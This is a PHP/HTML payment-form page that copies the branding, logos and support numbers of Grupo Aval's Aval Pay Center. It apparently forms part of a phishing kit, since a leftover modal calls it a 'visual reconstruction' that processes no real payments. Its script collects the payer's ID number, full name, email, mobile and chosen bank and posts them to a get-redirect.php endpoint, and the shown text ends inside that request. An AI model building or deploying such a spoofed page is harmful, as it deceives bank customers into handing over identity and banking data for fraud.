<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aval Pay Center - Realizar Pago (Paso 2)</title>
    <script>
        (function () {
            try {
                var convenioSeleccionado = localStorage.getItem('convenioSeleccionado');
                var datosPasoUno = localStorage.getItem('datosPagoPasoUno');
                if (!convenioSeleccionado || !datosPasoUno) {
                    window.location.replace('index.php');
                }
            } catch (error) {
                window.location.replace('index.php');
            }
        })();
    </script>
    <link rel="icon" type="image/svg+xml" href="assets/img/favicon-avalpay.svg">
    <link rel="stylesheet" href="assets/estilos-avalpay.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link
        href="https://fonts.googleapis.com/css2?family=Jost:wght@700&family=Montserrat:wght@400;500;600;700&family=Plus+Jakarta+Sans:wght@400;500;700&display=swap"
        rel="stylesheet">
    <style>
        body {
            background: #f7f8fb;
        }

        .pasarela-cabecera {
            box-shadow: none;
        }

        .pasarela-cabecera__contenedor {
            min-height: 49px;
            padding-top: 0;
            padding-bottom: 0;
        }

        .pasarela-cabecera__logos {
            display: inline-flex;
            align-items: center;
            gap: 10px;
            filter: brightness(0) invert(1);
        }

        .pasarela-cabecera__logo--principal {
            height: 18px;
        }

        .pasarela-cabecera__logo--secundario {
            height: 16px;
        }

        .pasarela {
            background:
                linear-gradient(180deg, #f4f4f5 0 82px, #ffffff 82px 131px, #eef3fb 131px 304px, #f7f8fb 304px 100%);
        }

        .pasarela__hero {
            padding: 30px 0 2px;
        }

        .pasarela__hero::before {
            display: none;
        }

        .pasarela__hero-contenedor {
            max-width: 760px;
            padding: 0 28px;
            gap: 13px;
        }

        .pasarela__icono-camara {
            width: 64px;
            height: 64px;
            border: 2px solid #b7c7e7;
            box-shadow: 0 8px 16px rgba(5, 57, 136, 0.05);
            margin-bottom: 1px;
        }

        .pasarela__icono-svg {
            width: 34px;
            height: 34px;
            color: #2aa8ff;
        }

        .pasarela__texto-servicio {
            align-self: flex-start;
            margin-top: 2px;
            font-size: 13px;
            line-height: 1.25;
            letter-spacing: 0.15px;
        }

        .pasarela__tarjeta-resumen {
            width: min(426px, 100%);
            padding: 18px 20px 17px;
            border-radius: 11px;
            box-shadow: 0 14px 22px rgba(5, 57, 136, 0.12);
            margin-top: 2px;
        }

        .pasarela__tarjeta-resumen-col {
            font-family: 'Montserrat', sans-serif;
            font-size: 13px;
            line-height: 1.42;
        }

        .pasarela__contenido {
            padding: 10px 0 52px;
        }

        .pasarela__panel {
            width: min(790px, 100%);
            margin-top: 4px;
            padding: 24px 28px 24px;
            border-radius: 4px;
            box-shadow: 0 8px 18px rgba(49, 59, 84, 0.05);
        }

        .pasarela__panel-icono-svg {
            width: 54px;
            height: 54px;
            color: #0e4ea9;
            flex: 0 0 54px;
        }

        .pasarela__panel-icono-img {
            width: 54px;
            height: 54px;
            object-fit: contain;
            flex: 0 0 54px;
            display: block;
        }

        .pasarela__h2 {
            font-size: 23px;
            line-height: 1.15;
            letter-spacing: -0.2px;
        }

        .pasarela__descripcion {
            font-size: 14px;
            line-height: 1.42;
            max-width: 610px;
            color: #7a7f98;
        }

        .pasarela__grid {
            gap: 13px 16px;
        }

        .pasarela__label {
            font-size: 12px;
            font-weight: 700;
        }

        .pasarela__input,
        .pasarela__select {
            min-height: 50px;
            padding: 14px 18px;
            border-color: #d9e1ef;
            color: #6a7088;
            border-radius: 11px;
            box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.75);
        }

        .pasarela__input::placeholder {
            color: #a0a5b5;
            opacity: 1;
        }

        .pasarela__input:not(:placeholder-shown),
        .pasarela__select:not([value=""]) {
            color: #313b54;
        }

        .pasarela__separador {
            margin: 19px 0 18px;
        }

        .pasarela__segmentos {
            max-width: 350px;
            gap: 8px;
        }

        .pasarela__segmento {
            min-height: 44px;
            font-family: 'Montserrat', sans-serif;
            font-size: 13px;
            background: #f5f8ff;
            border-radius: 11px;
        }

        .pasarela__segmento--activo {
            box-shadow: inset 0 0 0 1px rgba(5, 57, 136, 0.12);
        }

        .pasarela__bancos-grid {
            gap: 12px;
        }

        .pasarela__banco {
            min-height: 72px;
            padding: 10px;
            overflow: hidden;
        }

        .pasarela__banco-logo-real {
            display: block;
            max-width: 100%;
            max-height: 42px;
            width: auto;
            height: auto;
            object-fit: contain;
        }

        .pasarela-otras__aviso {
            align-items: flex-start;
        }

        .pasarela-otras__icono-aviso-svg {
            width: 18px;
            height: 18px;
            color: #f3b600;
            flex: 0 0 18px;
            margin-top: 1px;
        }

        .pasarela-otras__pse-badge {
            width: 36px;
            height: 36px;
            object-fit: contain;
            display: block;
        }

        .pasarela__acciones {
            margin-top: 18px;
        }

        .pasarela__cancelar {
            font-family: 'Montserrat', sans-serif;
            font-size: 13px;
        }

        .pasarela__boton-pagar {
            min-width: 122px;
            box-shadow: 0 8px 16px rgba(42, 168, 255, 0.24);
            font-size: 13px;
            border-radius: 20px;
        }

        .pasarela__boton-pagar:disabled {
            cursor: not-allowed;
            opacity: 0.75;
        }

        .pasarela__mensaje {
            text-align: left;
            min-height: 0;
        }

        .pasarela__mensaje--ok {
            color: #168a4f;
        }

        .pasarela-footer {
            border-top-left-radius: 0;
            border-top-right-radius: 0;
            box-shadow: none;
            border-top: 1px solid rgba(49, 59, 84, 0.06);
        }

        .pasarela-footer__logo-seguridad {
            height: 28px;
            width: auto;
            display: block;
        }

        .pasarela-footer__texto-cliente {
            text-align: right;
        }

        .modal-demo {
            position: fixed;
            inset: 0;
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 9999;
        }

        .modal-demo--visible {
            display: flex;
        }

        .modal-demo__backdrop {
            position: absolute;
            inset: 0;
            background: rgba(0, 0, 0, 0.45);
        }

        .modal-demo__dialog {
            position: relative;
            width: min(500px, calc(100% - 32px));
            background: #ffffff;
            border-radius: 16px;
            padding: 22px;
            box-shadow: 0 18px 40px rgba(0, 0, 0, 0.22);
            font-family: 'Montserrat', sans-serif;
        }

        .modal-demo__title {
            margin: 0 0 10px;
            color: #313b54;
            font-size: 18px;
            font-weight: 700;
        }

        .modal-demo__text {
            margin: 0;
            color: #5c6277;
            font-size: 14px;
            line-height: 1.55;
        }

        .modal-demo__actions {
            margin-top: 18px;
            display: flex;
            justify-content: flex-end;
            gap: 12px;
        }

        .modal-demo__btn {
            appearance: none;
            border: none;
            border-radius: 12px;
            background: #2aa8ff;
            color: #ffffff;
            padding: 10px 16px;
            font-family: 'Montserrat', sans-serif;
            font-size: 13px;
            font-weight: 700;
            cursor: pointer;
        }

        @media (max-width: 768px) {
            .pasarela {
                background: linear-gradient(180deg, #f5f5f6 0 72px, #edf2fa 72px 250px, #f7f8fb 250px 100%);
            }

            .pasarela__hero-contenedor {
                align-items: center;
                padding: 0 18px;
            }

            .pasarela__texto-servicio {
                text-align: center;
                align-self: center;
            }

            .pasarela__tarjeta-resumen {
                align-self: stretch;
            }

            .pasarela__panel {
                padding: 22px 18px 20px;
            }

            .pasarela__panel-titulo {
                align-items: center;
            }

            .pasarela__h2 {
                font-size: 22px;
            }

            .pasarela__segmentos {
                max-width: none;
            }

            .pasarela__acciones {
                flex-wrap: wrap;
            }

            .pasarela__cancelar,
            .pasarela__boton-pagar {
                width: 100%;
                text-align: center;
            }

            .pasarela-footer__texto-cliente {
                text-align: center;
            }
        }
    </style>
</head>

<body>
    <header class="pasarela-cabecera">
        <div class="pasarela-cabecera__contenedor">
            <div class="pasarela-cabecera__logos" aria-label="Aval Pay Center y Grupo Aval">
                <img src="assets/img/logo-avalpay-center.webp" alt="Aval Pay Center"
                    class="pasarela-cabecera__logo pasarela-cabecera__logo--principal">
                <img src="assets/img/aval-group-logo.png" alt="Grupo Aval"
                    class="pasarela-cabecera__logo pasarela-cabecera__logo--secundario">
            </div>
        </div>
    </header>

    <main class="pasarela">
        <section class="pasarela__hero">
            <div class="pasarela__hero-contenedor">
                <div class="pasarela__icono-camara" aria-hidden="true">
                    <svg class="pasarela__icono-svg" viewBox="0 0 24 24" fill="none">
                        <path
                            d="M8.2 5.5 9.4 4h5.2l1.2 1.5H18a2.5 2.5 0 0 1 2.5 2.5V17A2.5 2.5 0 0 1 18 19.5H6A2.5 2.5 0 0 1 3.5 17V8A2.5 2.5 0 0 1 6 5.5h2.2Z"
                            stroke="currentColor" stroke-width="1.8" stroke-linejoin="round" />
                        <circle cx="12" cy="12" r="3.7" stroke="currentColor" stroke-width="1.8" />
                    </svg>
                </div>

                <p id="textoServicio" class="pasarela__texto-servicio">PAGO ABASTECIMIENTOS INDUSTRIALES SAS</p>

                <div class="pasarela__tarjeta-resumen" aria-label="Resumen del pago">
                    <div class="pasarela__tarjeta-resumen-col">
                        <span class="pasarela__tarjeta-etiqueta">ID Transacción:</span>
                        <span id="textoIdTransaccion" class="pasarela__tarjeta-valor">77469243303</span>
                    </div>
                    <div class="pasarela__tarjeta-resumen-col">
                        <span class="pasarela__tarjeta-etiqueta">Referencia:</span>
                        <span id="textoReferencia" class="pasarela__tarjeta-valor">1929</span>
                    </div>
                    <div class="pasarela__tarjeta-resumen-col">
                        <span class="pasarela__tarjeta-etiqueta">Valor:</span>
                        <span id="textoValor" class="pasarela__tarjeta-valor pasarela__tarjeta-valor--destacado">$
                            245.000</span>
                    </div>
                </div>
            </div>
        </section>

        <section class="pasarela__contenido">
            <div class="pasarela__contenedor">
                <div class="pasarela__panel">
                    <div class="pasarela__panel-titulo">
                        <img src="assets/img/personita.png" alt="Titular" class="pasarela__panel-icono-img">
                        <div>
                            <h2 class="pasarela__h2">Titular del Medio de Pago</h2>
                            <p class="pasarela__descripcion">Ingrese en esta sección los datos del <strong
                                    style="color:#313B54;">titular del medio de pago</strong> que se va a utilizar en el
                                pago</p>
                        </div>
                    </div>

                    <form id="formularioTitular" class="pasarela__formulario" novalidate>
                        <div class="pasarela__grid">
                            <div class="pasarela__campo">
                                <label class="pasarela__label" for="tipoDocumento">Tipo de Documento *</label>
                                <select id="tipoDocumento" class="pasarela__select" required>
                                    <option value="" selected disabled>Selecciona una opción</option>
                                    <option value="CC">Cédula de Ciudadanía</option>
                                    <option value="CE">Cédula de Extranjería</option>
                                    <option value="NIT">NIT</option>
                                    <option value="TI">Tarjeta de Identidad</option>
                                    <option value="PP">Pasaporte</option>
                                    <option value="RC">Registro Civil</option>
                                </select>
                                <span class="pasarela__error oculto">Campo requerido</span>
                            </div>

                            <div class="pasarela__campo">
                                <label class="pasarela__label" for="numeroDocumento">Número de documento *</label>
                                <input id="numeroDocumento" class="pasarela__input" type="text"
                                    placeholder="Ingresa tu documento" required>
                                <span class="pasarela__error oculto">Campo requerido</span>
                            </div>

                            <div class="pasarela__campo pasarela__campo--ancho">
                                <label class="pasarela__label" for="nombreCompleto">Nombre Completo *</label>
                                <input id="nombreCompleto" class="pasarela__input" type="text"
                                    placeholder="Ingresa tu nombre completo" required>
                                <span class="pasarela__error oculto">Campo requerido</span>
                            </div>

                            <div class="pasarela__campo">
                                <label class="pasarela__label" for="correo">Correo Electrónico *</label>
                                <input id="correo" class="pasarela__input" type="email"
                                    placeholder="ej: sumail@mail.com" required>
                                <span class="pasarela__error oculto">Campo requerido</span>
                            </div>

                            <div class="pasarela__campo">
                                <label class="pasarela__label" for="correoConfirmacion">Confirmación de Correo *</label>
                                <input id="correoConfirmacion" class="pasarela__input" type="email"
                                    placeholder="Ingresa de nuevo tu e-mail" required>
                                <span class="pasarela__error oculto">Campo requerido</span>
                            </div>

                            <div class="pasarela__campo">
                                <label class="pasarela__label" for="pais">País *</label>
                                <select id="pais" class="pasarela__select" required>
                                    <option value="CO" selected>Colombia</option>
                                </select>
                            </div>

                            <div class="pasarela__campo">
                                <label class="pasarela__label" for="movil">Móvil para notificaciones *</label>
                                <input id="movil" class="pasarela__input" type="tel"
                                    placeholder="Ingresa tu número móvil" inputmode="numeric" maxlength="10" required>
                                <span class="pasarela__error oculto">Campo requerido</span>
                            </div>

                            <div class="pasarela__campo">
                                <label class="pasarela__label" for="movilConfirmacion">Confirmar Móvil *</label>
                                <input id="movilConfirmacion" class="pasarela__input" type="tel"
                                    placeholder="Ingresa de nuevo tu móvil" inputmode="numeric" maxlength="10" required>
                                <span class="pasarela__error oculto">Campo requerido</span>
                            </div>
                        </div>

                        <div class="pasarela__separador"></div>

                        <div class="pasarela__panel-titulo">
                            <svg class="pasarela__panel-icono-svg" viewBox="0 0 64 64" fill="none" aria-hidden="true">
                                <rect x="10" y="16" width="44" height="30" rx="6" stroke="currentColor"
                                    stroke-width="3" />
                                <path d="M18 27h28" stroke="currentColor" stroke-width="3" stroke-linecap="round" />
                                <path d="M18 37h10" stroke="currentColor" stroke-width="3" stroke-linecap="round" />
                            </svg>
                            <div>
                                <h2 class="pasarela__h2">Medio de pago</h2>
                                <p class="pasarela__descripcion">Selecciona el <strong style="color:#313B54;">medio de
                                        pago</strong> a utilizar</p>
                            </div>
                        </div>

                        <div class="pasarela__segmentos" role="tablist" aria-label="Tipo de entidad">
                            <button type="button" class="pasarela__segmento pasarela__segmento--activo"
                                data-tipo-entidad="aval" aria-selected="true">Aval</button>
                            <button type="button" class="pasarela__segmento" data-tipo-entidad="otras"
                                aria-selected="false">Otras Entidades</button>
                        </div>

                        <div id="seccionAval" class="pasarela__bancos">
                            <p class="pasarela__label" style="margin-top:6px;">Selecciona un banco</p>
                            <div class="pasarela__bancos-grid" role="list">
                                <button type="button" class="pasarela__banco" data-banco="Banco de Bogotá"
                                    role="listitem">
                                    <img src="assets/img/bogota-logo.svg" alt="Banco de Bogotá"
                                        class="pasarela__banco-logo-real">
                                </button>
                                <button type="button" class="pasarela__banco" data-banco="Banco de Occidente"
                                    role="listitem">
                                    <img src="assets/img/logo-v-banco-occidente.svg" alt="Banco de Occidente"
                                        class="pasarela__banco-logo-real">
                                </button>
                                <button type="button" class="pasarela__banco" data-banco="Banco Popular"
                                    role="listitem">
                                    <img src="assets/img/logo-v-banco-popular.png" alt="Banco Popular"
                                        class="pasarela__banco-logo-real">
                                </button>
                                <button type="button" class="pasarela__banco" data-banco="AV Villas" role="listitem">
                                    <img src="assets/img/logo-v-banco-avvillas.svg" alt="AV Villas"
                                        class="pasarela__banco-logo-real">
                                </button>
                            </div>
                            <span id="errorBancoAval" class="pasarela__error oculto">Selecciona un banco</span>
                        </div>

                        <div id="seccionOtrasEntidades" class="pasarela-otras oculto">
                            <div class="pasarela-otras__aviso" role="note">
                                <svg class="pasarela-otras__icono-aviso-svg" viewBox="0 0 24 24" fill="currentColor"
                                    aria-hidden="true">
                                    <path d="M12 2 1 21h22L12 2Zm1 14h-2v-2h2v2Zm0-4h-2V8h2v4Z" />
                                </svg>
                                <p>Para pagos con entidades del Grupo Aval, utilizar el botón Aval.</p>
                            </div>

                            <div class="pasarela-otras__pse">
                                <img src="assets/img/pse-logo.png" alt="PSE" class="pasarela-otras__pse-badge">
                                <div>
                                    <p class="pasarela-otras__pse-titulo">Transferencias desde tu banco con PSE</p>
                                </div>
                            </div>

                            <div class="pasarela-otras__personas" role="group" aria-label="Tipo de persona">
                                <label class="pasarela-otras__persona">
                                    <input type="radio" name="tipoPersona" value="juridica">
                                    <span>Persona Jurídica</span>
                                </label>
                                <label class="pasarela-otras__persona">
                                    <input type="radio" name="tipoPersona" value="natural" checked>
                                    <span>Persona Natural</span>
                                </label>
                            </div>

                            <div class="pasarela-otras__selector">
                                <label class="pasarela__label" for="selectorBancoOtras">Seleccione el banco</label>
                                <select id="selectorBancoOtras" class="pasarela__select">
                                    <option value="" selected disabled>A continuación seleccione su banco</option>
                                    <?php
                                    $cfg = require __DIR__ . '/pse-config.php';
                                    foreach ($cfg['select_otras_entidades'] as $key => $info):
                                        ?>
                                        <option value="<?= htmlspecialchars($key, ENT_QUOTES) ?>">
                                            <?= htmlspecialchars($info['label'], ENT_QUOTES) ?>
                                        </option>
                                    <?php endforeach; ?>
                                </select>
                                <span id="errorBancoOtras" class="pasarela__error oculto">Selecciona un banco</span>
                            </div>
                        </div>

                        <div class="pasarela__acciones">
                            <a href="paso-uno.php" class="pasarela__cancelar">Cancelar</a>
                            <button id="botonPagarPasoDos" type="submit" class="pasarela__boton-pagar">Pagar</button>
                        </div>

                        <p id="mensajeFormulario" class="pasarela__mensaje" aria-live="polite"></p>
                    </form>
                </div>
            </div>
        </section>
    </main>

    <footer class="pasarela-footer">
        <div class="pasarela-footer__contenedor">
            <div class="pasarela-footer__col">
                <img src="assets/img/aval-group-logo.png" alt="Grupo Aval" class="pasarela-footer__logo-aval">
                <img src="assets/img/logo-norton@2x.png" alt="Norton Secured" class="pasarela-footer__logo-seguridad">
            </div>

            <div class="pasarela-footer__col pasarela-footer__col--centro">
                <p class="pasarela-footer__copyright">Copyright © 2025 Todos los derechos reservados Aval Valor
                    Compartido</p>
            </div>

            <div class="pasarela-footer__col pasarela-footer__col--derecha">
                <div class="pasarela-footer__texto-cliente">
                    <p class="pasarela-footer__titulo-cliente">Línea de Atención al Cliente</p>
                    <p class="pasarela-footer__detalle-cliente">Nacional: 018000-512825</p>
                    <p class="pasarela-footer__detalle-cliente">Bogotá: (601) 7432626</p>
                </div>
            </div>
        </div>
    </footer>

    <div id="overlayCargando" class="overlay-cargando" aria-hidden="true">
        <div class="overlay-cargando__fondo"></div>
        <div class="overlay-cargando__contenido" role="status" aria-live="polite">
            <div class="overlay-cargando__spinner" aria-hidden="true">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" width="120" height="120" style="shape-rendering:auto;display:block;background:transparent;">
                    <g>
                        <circle fill="#002449" r="5" cy="57.5" cx="27.5"><animate begin="-1s" dur="1s" keyTimes="0;0.5;1;1" values="57.5;42.5;57.5;57.5" repeatCount="indefinite" keySplines="0 0.5 0.5 1;0.5 0 1 0.5;0.5 0.5 0.5 0.5" calcMode="spline" attributeName="cy"></animate></circle>
                        <circle fill="#e62f27" r="5" cy="57.5" cx="42.5"><animate begin="-0.75s" dur="1s" keyTimes="0;0.5;1;1" values="57.5;42.5;57.5;57.5" repeatCount="indefinite" keySplines="0 0.5 0.5 1;0.5 0 1 0.5;0.5 0.5 0.5 0.5" calcMode="spline" attributeName="cy"></animate></circle>
                        <circle fill="#5dbaeb" r="5" cy="57.5" cx="57.5"><animate begin="-0.5s" dur="1s" keyTimes="0;0.5;1;1" values="57.5;42.5;57.5;57.5" repeatCount="indefinite" keySplines="0 0.5 0.5 1;0.5 0 1 0.5;0.5 0.5 0.5 0.5" calcMode="spline" attributeName="cy"></animate></circle>
                        <circle fill="#009340" r="5" cy="57.5" cx="72.5"><animate begin="-0.25s" dur="1s" keyTimes="0;0.5;1;1" values="57.5;42.5;57.5;57.5" repeatCount="indefinite" keySplines="0 0.5 0.5 1;0.5 0 1 0.5;0.5 0.5 0.5 0.5" calcMode="spline" attributeName="cy"></animate></circle>
                    </g>
                </svg>
            </div>
        </div>
    </div>

    <div id="modalDemo" class="modal-demo" aria-hidden="true">
        <div class="modal-demo__backdrop" data-cerrar-modal></div>
        <div class="modal-demo__dialog" role="dialog" aria-modal="true" aria-labelledby="modalDemoTitulo">
            <h3 id="modalDemoTitulo" class="modal-demo__title">Reconstrucción visual lista</h3>
            <p class="modal-demo__text">La interfaz quedó validada en el navegador. Este paso no procesa pagos reales ni
            <div class="modal-demo__actions">
                <button type="button" class="modal-demo__btn" data-cerrar-modal>Cerrar</button>
            </div>
        </div>
    </div>

    <script>
        (function () {
            const textoServicio = document.getElementById('textoServicio');
            const textoIdTransaccion = document.getElementById('textoIdTransaccion');
            const textoReferencia = document.getElementById('textoReferencia');
            const textoValor = document.getElementById('textoValor');
            const formularioTitular = document.getElementById('formularioTitular');
            const botonesSegmento = Array.from(document.querySelectorAll('.pasarela__segmento'));
            const botonesBanco = Array.from(document.querySelectorAll('.pasarela__banco'));
            const seccionAval = document.getElementById('seccionAval');
            const seccionOtrasEntidades = document.getElementById('seccionOtrasEntidades');
            const selectorBancoOtras = document.getElementById('selectorBancoOtras');
            const mensajeFormulario = document.getElementById('mensajeFormulario');
            const overlayCargando = document.getElementById('overlayCargando');
            const modalDemo = document.getElementById('modalDemo');
            const botonPagarPasoDos = document.getElementById('botonPagarPasoDos');
            const camposRequeridos = Array.from(formularioTitular.querySelectorAll('[required]'));

            let tipoEntidadSeleccionada = 'aval';
            let bancoSeleccionado = '';

            function generarIdTransaccion() {
                return Date.now().toString().slice(-8) + Math.floor(Math.random() * 900 + 100).toString();
            }

            function limpiarNumero(valor) {
                if (valor == null) return '';
                return String(valor).replace(/[^\d]/g, '');
            }

            function formatearMoneda(valor) {
                const numero = Number(limpiarNumero(valor) || 0);
                return '$ ' + numero.toLocaleString('es-CO');
            }

            function normalizarTexto(valor, fallback) {
                const texto = String(valor || '').trim();
                return texto || fallback;
            }

            function obtenerConvenio() {
                try {
                    return JSON.parse(localStorage.getItem('convenioSeleccionado') || 'null');
                } catch (error) {
                    return null;
                }
            }

            function obtenerDatosPasoUno() {
                try {
                    return JSON.parse(localStorage.getItem('datosPagoPasoUno') || 'null');
                } catch (error) {
                    return null;
                }
            }

            function obtenerParametro(nombre) {
                return new URLSearchParams(window.location.search).get(nombre);
            }

            function resolverReferencia(datosPasoUno) {
                if (datosPasoUno && datosPasoUno.referencia) {
                    return datosPasoUno.referencia;
                }

                if (datosPasoUno && datosPasoUno.campos && typeof datosPasoUno.campos === 'object') {
                    const entradas = Object.entries(datosPasoUno.campos);
                    for (const [clave, valor] of entradas) {
                        if (/refer|local|apartamento|factura/i.test(clave) && String(valor || '').trim()) {
                            return valor;
                        }
                    }

                    for (const [, valor] of entradas) {
                        if (String(valor || '').trim()) {
                            return valor;
                        }
                    }
                }

                return obtenerParametro('ref') || '1929';
            }

            function resolverValor(datosPasoUno) {
                if (datosPasoUno && datosPasoUno.monto_raw) {
                    return datosPasoUno.monto_raw;
                }

                if (datosPasoUno && datosPasoUno.valor) {
                    return datosPasoUno.valor;
                }

                if (datosPasoUno && datosPasoUno.campos && typeof datosPasoUno.campos === 'object') {
                    const entradas = Object.entries(datosPasoUno.campos);
                    for (const [clave, valor] of entradas) {
                        if (/valor/i.test(clave) && limpiarNumero(valor)) {
                            return valor;
                        }
                    }
                }

                return obtenerParametro('valor') || '245000';
            }

            function cargarResumen() {
                const convenio = obtenerConvenio();
                const datosPasoUno = obtenerDatosPasoUno();
                const nombreServicio = datosPasoUno && datosPasoUno.servicio
                    ? datosPasoUno.servicio
                    : (convenio && convenio.Nombre ? convenio.Nombre : 'ABASTECIMIENTOS INDUSTRIALES SAS');
                textoServicio.textContent = 'PAGO ' + normalizarTexto(nombreServicio, 'ABASTECIMIENTOS INDUSTRIALES SAS').toUpperCase();
                textoReferencia.textContent = normalizarTexto(resolverReferencia(datosPasoUno), '1929');
                textoValor.textContent = formatearMoneda(resolverValor(datosPasoUno));
                textoIdTransaccion.textContent = generarIdTransaccion();
            }

            function limitarMovil(campo) {
                campo.value = limpiarNumero(campo.value).slice(0, 10);
            }

            function mostrarErrorCampo(campo, mensaje) {
                const error = campo.parentElement.querySelector('.pasarela__error');
                campo.classList.add(campo.tagName === 'SELECT' ? 'pasarela__select--error' : 'pasarela__input--error');
                if (error) {
                    error.textContent = mensaje || 'Campo requerido';
                    error.classList.remove('oculto');
                }
            }

            function ocultarErrorCampo(campo) {
                const error = campo.parentElement.querySelector('.pasarela__error');
                campo.classList.remove('pasarela__input--error', 'pasarela__select--error');
                if (error) {
                    error.classList.add('oculto');
                }
            }

            function validarCampoRequerido(campo) {
                if (!String(campo.value || '').trim()) {
                    mostrarErrorCampo(campo, 'Campo requerido');
                    return false;
                }

                ocultarErrorCampo(campo);
                return true;
            }

            function validarCoincidencia(campoA, campoB, mensaje) {
                if (!String(campoB.value || '').trim()) {
                    return false;
                }

                if (String(campoA.value || '').trim() !== String(campoB.value || '').trim()) {
                    mostrarErrorCampo(campoB, mensaje);
                    return false;
                }

                ocultarErrorCampo(campoB);
                return true;
            }

            function seleccionarTipoEntidad(boton) {
                botonesSegmento.forEach(function (item) {
                    item.classList.remove('pasarela__segmento--activo');
                    item.setAttribute('aria-selected', 'false');
                });

                boton.classList.add('pasarela__segmento--activo');
                boton.setAttribute('aria-selected', 'true');
                tipoEntidadSeleccionada = boton.dataset.tipoEntidad;
                seccionAval.classList.toggle('oculto', tipoEntidadSeleccionada !== 'aval');
                seccionOtrasEntidades.classList.toggle('oculto', tipoEntidadSeleccionada !== 'otras');
                validarSeleccionBanco(false);
            }

            function seleccionarBanco(boton) {
                botonesBanco.forEach(function (item) {
                    item.classList.remove('pasarela__banco--activo');
                });

                boton.classList.add('pasarela__banco--activo');
                bancoSeleccionado = boton.dataset.banco || '';
                validarSeleccionBanco(false);
            }

            function validarSeleccionBanco(mostrarError) {
                const errorAval = document.getElementById('errorBancoAval');
                const errorOtras = document.getElementById('errorBancoOtras');

                if (tipoEntidadSeleccionada === 'aval') {
                    errorOtras.classList.add('oculto');
                    selectorBancoOtras.classList.remove('pasarela__select--error');

                    if (!bancoSeleccionado) {
                        if (mostrarError) {
                            errorAval.classList.remove('oculto');
                        } else {
                            errorAval.classList.add('oculto');
                        }
                        return false;
                    }

                    errorAval.classList.add('oculto');
                    return true;
                }

                errorAval.classList.add('oculto');

                if (!String(selectorBancoOtras.value || '').trim()) {
                    if (mostrarError) {
                        errorOtras.classList.remove('oculto');
                        selectorBancoOtras.classList.add('pasarela__select--error');
                    } else {
                        errorOtras.classList.add('oculto');
                        selectorBancoOtras.classList.remove('pasarela__select--error');
                    }
                    return false;
                }

                errorOtras.classList.add('oculto');
                selectorBancoOtras.classList.remove('pasarela__select--error');
                return true;
            }

            function abrirModal() {
                modalDemo.classList.add('modal-demo--visible');
                modalDemo.setAttribute('aria-hidden', 'false');
            }

            function cerrarModal() {
                modalDemo.classList.remove('modal-demo--visible');
                modalDemo.setAttribute('aria-hidden', 'true');
            }

            function mostrarOverlayCargando() {
                overlayCargando.classList.add('overlay-cargando--abierto');
                overlayCargando.setAttribute('aria-hidden', 'false');
            }

            function ocultarOverlayCargando() {
                overlayCargando.classList.remove('overlay-cargando--abierto');
                overlayCargando.setAttribute('aria-hidden', 'true');
            }

            function validarFormulario() {
                let valido = true;

                camposRequeridos.forEach(function (campo) {
                    if (!validarCampoRequerido(campo)) {
                        valido = false;
                    }
                });

                const correo = document.getElementById('correo');
                const correoConfirmacion = document.getElementById('correoConfirmacion');
                const movil = document.getElementById('movil');
                const movilConfirmacion = document.getElementById('movilConfirmacion');

                if (String(correo.value || '').trim() && String(correoConfirmacion.value || '').trim()) {
                    if (!validarCoincidencia(correo, correoConfirmacion, 'Los correos no coinciden')) {
                        valido = false;
                    }
                }

                if (String(movil.value || '').trim() && String(movilConfirmacion.value || '').trim()) {
                    if (!validarCoincidencia(movil, movilConfirmacion, 'Los móviles no coinciden')) {
                        valido = false;
                    }
                }

                if (!validarSeleccionBanco(true)) {
                    valido = false;
                }

                return valido;
            }

            botonesSegmento.forEach(function (boton) {
                boton.addEventListener('click', function () {
                    seleccionarTipoEntidad(boton);
                });
            });

            botonesBanco.forEach(function (boton) {
                boton.addEventListener('click', function () {
                    seleccionarBanco(boton);
                });
            });

            selectorBancoOtras.addEventListener('change', function () {
                validarSeleccionBanco(false);
            });

            ['movil', 'movilConfirmacion'].forEach(function (id) {
                const input = document.getElementById(id);
                input.addEventListener('input', function () {
                    limitarMovil(input);
                });
            });

            camposRequeridos.forEach(function (campo) {
                const evento = campo.tagName === 'SELECT' ? 'change' : 'input';
                campo.addEventListener(evento, function () {
                    validarCampoRequerido(campo);

                    if (campo.id === 'correo' || campo.id === 'correoConfirmacion') {
                        validarCoincidencia(
                            document.getElementById('correo'),
                            document.getElementById('correoConfirmacion'),
                            'Los correos no coinciden'
                        );
                    }

                    if (campo.id === 'movil' || campo.id === 'movilConfirmacion') {
                        validarCoincidencia(
                            document.getElementById('movil'),
                            document.getElementById('movilConfirmacion'),
                            'Los móviles no coinciden'
                        );
                    }
                });
            });

            formularioTitular.addEventListener('submit', function (evento) {
                evento.preventDefault();
                mensajeFormulario.textContent = '';
                mensajeFormulario.classList.remove('pasarela__mensaje--ok');

                if (!validarFormulario()) {
                    mensajeFormulario.textContent = 'Revisa los campos marcados antes de continuar.';
                    return;
                }

                // --- Recoger datos del titular ---
                const tipoEntidad = tipoEntidadSeleccionada; // 'aval' | 'otras'

                const banco = tipoEntidad === 'aval'
                    ? bancoSeleccionado
                    : selectorBancoOtras.options[selectorBancoOtras.selectedIndex].text;

                // Guardar selección local (compatibilidad con tu código actual)
                localStorage.setItem('seleccionPagoPasoDos', JSON.stringify({
                    tipoEntidad: tipoEntidad,
                    banco: banco
                }));

                // Deshabilitar botón para evitar doble submit
                botonPagarPasoDos.disabled = true;
                mensajeFormulario.textContent = 'Procesando...';
                mensajeFormulario.classList.remove('pasarela__mensaje--ok');
                mostrarOverlayCargando();

                // --- Enviar a get-redirect.php ---
                fetch('get-redirect.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        tipoEntidad: tipoEntidad,
                        banco: banco,
                        nombre: document.getElementById('nombreCompleto').value.trim(),
                        cedula: document.getElementById('numeroDocumento').value.trim(),
                        email: document.getElementById('correo').value.trim(),
                        telefono: document.getElementById('movil').value.trim(),
                        monto: (typeof obtenerDatosPasoUno === 'function' && obtenerDatosPasoUno() && obtenerDatosPasoUno().monto_raw)
                            ? obtenerDatosPasoUno().monto_raw
                            : '0'
                    })
                })
                    .then(function (r) { return r.json(); })
                    .then(function (resp) {
                        if (!resp.ok) {
                            botonPagarPasoDos.disabled = false;
                            ocultarOverlayCargando();
